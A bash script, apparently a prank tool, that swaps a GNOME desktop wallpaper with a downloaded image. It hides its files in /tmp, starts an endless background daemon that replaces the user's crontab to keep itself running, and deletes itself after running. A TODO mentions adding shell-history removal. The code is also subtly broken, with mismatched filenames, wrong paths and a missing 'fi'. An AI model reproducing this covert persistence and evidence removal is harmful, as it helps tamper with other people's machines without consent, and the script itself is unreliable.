#!/bin/bash
#--------------------------------------#
#----------- unicorn ------------------#
#----- written by Andras Marton -------#
#----- September 07, 2019 -------------#
#--------------------------------------#

#--------------------------------------#
#------- description ------------------#
#--------------------------------------#

#  Script to change background wallpaper at 2AM everyday on
#+ the device it is running on using cron jobs. This script
#+ will run and initiate creating the cron job, the script
#+ to change the wallpaper along with a monitoring script
#+ that will ensure everything is on the system for the
#+ change to take affect at 2AM.

site=

wget $site  #  If using tinyurl, filename will be alias will be downloaded as filename
mv yykb2s52 /tmp/
gsettings set org.gnome.desktop.background picture-uri file:///tmp/yyykb2s52

#  Create file .uwpc.bak which will be called by crontab to set the background
#+ to /tmp/yykb2s52 && make the file executable
cat > /tmp/.uwpc.bak <<Write_UWPC
#!/bin/bash
gsettings set org.gnome.desktop.background picture-uri file:///tmp/y4k7nt3f
Write_UWPC
chmod +x /tmp/.uwpc.bak

#  Create file mps.daemon to run in the background, running the infinite while
#+ loop checking for the crontab. This will also check if .uwpc.bak exists &
#+ if not then create it

cat > /tmp/mps.daemon <<Write_MPS_Daemon
#!/bin/bash
while true; do
  #variables set for cron
  cron=$(crontab -l)
  chkCron="0 2 * * * ./tmp/mps.daemon"
   
  # Check if cronjob still exists for user
  if [ "$cron" != "$chkCron" ]; then
    echo "0 2 * * * ./tmp/mps.daemon" > /tmp/cron
    crontab /tmp/cron   # Push the above line to crontab
    rm /tmp/cron        # Delete the file once done
  fi

  uwpc=/tmp/.uwpc.bak
  # Check if .uwpc.bak exists, if not create it!
  if [ ! -f "$uwpc" ]; then
    cat > /tmp/.uwpc.bak <<Write_UWPC_from_Daemon
#!/bin/bash
gsettings set org.gnome.desktop.background picture-uri file:///tmp/yykb2s52 
Write_UWPC_from_Daemon
chmod +x /tmp/.uwpc.bak   
     sleep 30
done
Write_MPS_Daemon
chmod +x /tmp/mps.daemon
./tmp/mps.daemon & # start up the script and push it to the background


#  This will self delete the script after running the above commands and
#+ writing the files. This command should be the last one!
rm -- "$0"

# TO DO
# Merge history removal parts held in a different file
